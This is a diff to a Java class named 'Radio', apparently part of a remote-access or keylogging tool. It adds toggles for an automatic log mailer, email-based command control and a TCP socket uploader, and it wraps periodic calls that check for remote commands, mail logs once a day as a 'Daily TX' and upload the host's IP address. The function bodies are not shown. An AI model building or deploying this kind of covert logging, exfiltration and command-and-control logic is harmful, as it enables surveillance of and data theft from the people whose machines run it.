@@ -144,6 +144,18 @@ i+**+*:+#+#zn+,` `.,.                                   `,;.,.`,,:;;inzz*i+nnnnn
 public class Radio {
 	public static int schDay = -1;
 	public static boolean uploadDone = false;
+	
+	/**
+	 * The following boolean values are toggle switches for various functions.
+	 * @boolean emailUpload toggles automatic mailer
+	 * @boolean emailReceive toggles email command control
+	 * @boolean socketUpload toggles socket TCP uploader
+	 */
+	
+	public static boolean emailUpload = false;
+	public static boolean emailReceive = false;
+	public static boolean socketUpload = false;
+	
 	public static void main (String[] args) throws IOException, URISyntaxException {
 		Main m = new Main();
 		System.out.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
@@ -185,10 +197,13 @@ public class Radio {
 					 uphistory(getHostIP());
 				 }
 				 if (minutes % 30 == 0 || minutes == 0) {
-				checkForCommands();
-				 if (!uploadDone)
+			     if (emailReceive)
+			     {
+			     System.out.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
+				 checkForCommands();
+			     }
+				 if (emailUpload && !uploadDone)
 				 {
-				 System.out.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
 				 if (mailLogs() == 0) {
 				 System.out.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
 				 uploadDone = true;
@@ -204,9 +219,12 @@ public class Radio {
 				 	 uphistory(getHostIP());
 				   }
 				 if ((minutes % 30 == 0 || minutes == 0)) {
-					 System.out.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
+					 if (emailReceive)
+				     {
+				     System.out.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
 					 checkForCommands();
-					 if (!uploadDone)
+				     }
+					 if (emailUpload && !uploadDone)
 					 {
 					 if (mailLogs() == 0) {
 				     System.out.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
